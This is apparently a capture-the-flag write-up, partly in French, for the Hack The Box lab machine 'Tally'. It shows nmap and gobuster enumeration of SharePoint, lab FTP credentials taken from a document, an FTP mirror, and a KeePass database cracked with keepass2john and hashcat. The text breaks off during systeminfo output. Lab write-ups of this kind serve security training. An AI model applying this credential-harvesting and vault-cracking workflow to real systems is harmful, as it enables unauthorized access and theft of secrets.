# HTB - Tally  10.10.10.59


Windows Server 2016
Microsoft IIS httpd 10.0
SharePoint
SQL Server 2016 13.00.1601.00; RTM

- Well Known URL for Sharepoint


# nmap
```
# nmap -A 10.10.10.59
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-01 18:11 CEST
Nmap scan report for 10.10.10.59
Host is up (0.22s latency).
Not shown: 992 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-generator: Microsoft SharePoint
|_http-server-header: Microsoft-IIS/10.0
| http-title: Home
|_Requested resource was http://10.10.10.59/_layouts/15/start.aspx#/default.aspx
81/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
808/tcp  open  ccproxy-http?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2016 13.00.1601.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: TALLY
|   NetBIOS_Domain_Name: TALLY
|   NetBIOS_Computer_Name: TALLY
|   DNS_Domain_Name: TALLY
|   DNS_Computer_Name: TALLY
|_  Product_Version: 10.0.14393
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2019-09-01T16:03:30
|_Not valid after:  2049-09-01T16:03:30
|_ssl-date: 2019-09-01T16:05:15+00:00; -7m40s from scanner time.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=9/1%OT=21%CT=1%CU=33438%PV=Y%DS=2%DC=T%G=Y%TM=5D6BEE0F
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=I%CI=RD%II=I%SS=S%TS=
OS:5)SEQ(SP=104%GCD=1%ISR=10B%CI=RD%II=I%TS=B)SEQ(SP=104%GCD=2%ISR=10C%TI=R
OS:D%CI=RD%II=I%TS=B)OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M
OS:54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%W3=2000%W4=200
OS:0%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%D
OS:F=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0
OS:%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=
OS:A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=
OS:Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=A
OS:R%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%R
OS:UD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -7m39s, deviation: 0s, median: -7m40s
| ms-sql-info: 
|   10.10.10.59:1433: 
|     Version: 
|       name: Microsoft SQL Server 2016 RTM
|       number: 13.00.1601.00
|       Product: Microsoft SQL Server 2016
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-09-01 18:05:18
|_  start_date: 2019-09-01 18:02:49

```

# Sharepoint

![](images/tally_sharepoint.png)

# Sharepoint : gobuster with sharepoint list from SecLists

Note : Sharepoint is VERY slow in boxes

```
wget https://github.com/danielmiessler/SecLists/archive/master.zip
```
=> /usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/sharepoint.txt 


```
# gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/sharepoint.txt -u http://tally/
/_layouts/1033/avreport.htm (Status: 200)
/_layouts/1033/filedlg.htm (Status: 200)
/_layouts/1033/fontdlg.htm (Status: 200)
/_layouts/1033/error.htm (Status: 200)
/_layouts/1033/iframe.htm (Status: 200)
/_layouts/1033/images (Status: 301)
....
L'ideal est de connaitre les url interressantes...
```

# Sharepoint : Known sharepoint url  => ftp credentials

![](images/tally_sharepoint_viewlst.png)
http://10.10.10.59/_layouts/viewlsts.aspx


=> Document/ftp-details.docx
apt-get install libreoffice
```
FTP details
hostname: tally
workgroup: htb.local
password: UTDRSCH53c"$6hys
Please create your own user folder upon logging in
```

=> Site Pages/Finance Team 
```
Hi all,

Welcome to your new team page!

As always, there's still a few finishing touches to make.  Rahul - please upload the design mock ups to the Intranet folder as 'index.html' using the ftp_user account - I aim to review regularly.

We'll also add the fund and client account pages in due course.

Thanks – Sarah & Tim.
```

!!!!!! Cette page ne s'affiche que si l'url est http:///tally/. Avec http://10.10.10.59, on est redirigé sur l'accueil...

On ajoute tally.htb.local dans /etc/hosts
```
10.10.10.59	tally tally.htb.local
```

# ftp

user : ftp_user
Passwd : UTDRSCH53c"$6hys
```
# ftp tally
Connected to tally.
220 Microsoft FTP Service
Name (tally:root): ftp_user
331 Password required
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
```
 
Mirror localy the server
```
wget --mirror 'ftp://ftp_user:UTDRSCH53c"$6hys@tally.htb.local'
```
=> employees-id_number.xlsx
=> tim.kdbx
=> tim/todo.txt
```
To do:
Remove migration folder
Set secure share permissions
encrypted share creds:
password in keepass
```


# Keepass


```
     keepass2john tim.kdbx 
tim:$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da
https://hashcat.net/wiki/doku.php?id=example_hashes
$keepass$*2*6000*222*f3 => 
13400 :	KeePass 2 AES / without keyfile 	$keepass$*2*6000*222*a279e37c
13400 : Keepass 2 AES / with keyfile 	$keepass$*2*6000*222*15b6

cat tim.keepass
$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da

hashcat -m 13400 tim.keepass

=> simplementeyo

```


# systeminfo

````
 Host Name:                 TALLY                                                   
	OS Name:                   Microsoft Windows Server 2016 Standard
	OS Version:                10.0.14393 N/A Build 14393 
	OS Manufacturer:           Microsoft Corporation  
	OS Configuration:          Standalone Server 
	OS Build Type:             Multiprocessor Free 
	Registered Owner:          Windows User       
	Registered Organization:                      
	Product ID:                00376-30726-67778-AA877
	Original Install Date:     28/08/2017, 15:43:34   
	System Boot Time:          17/02/2018, 20:05:52      

	System Manufacturer:       VMware, Inc.   
	System Model:              VMware Virtual Platform    

	System Type:               x64-based PC   
	Processor(s):              2 Processor(s) Installed.    

	                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2600 Mhz       

	                           [02]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2600 Mhz    

	BIOS Version:              Phoenix Technologies LTD 6.00, 05/04/2016 

	Windows Directory:         C:\Windows                

	System Directory:          C:\Windows\system32       

	Boot Device:               \Device\HarddiskVolume1    

	System Locale:             en-gb;English (United Kingdom) 

	Input Locale:              en-gb;English (United Kingdom) 

	Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London                                               

	Total Physical Memory:     2,047 MB  
	Available Physical Memory: 231 MB                                                                            
	Virtual Memory: Max Size:  4,458 MB    
	Virtual Memory: Available: 657 MB                    

	Virtual Memory: In Use:    3,801 MB                  

	Page File Location(s):     C:\pagefile.sys           

	Domain:                    HTB.LOCAL                

	Logon Server:              \\TALLY       
	Hotfix(s):                 2 Hotfix(s) Installed. 
	                           [01]: KB3199986           

	                           [02]: KB4015217           

	Network Card(s):           1 NIC(s) Installed.  
	                           [01]: Intel(R) 82574L Gigabit Network Connection                                                   
	                                 Connection Name: Ethernet0  

	                                 DHCP Enabled:    No  

	                                 IP address(es)     

	                                 [01]: 10.10.10.59   

	                                 [02]: fe80::c5bc:7321:fb5d:9066

	                                 [03]: dead:beef::c5bc:7321:fb5d:9066  
                                                          

Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will
````
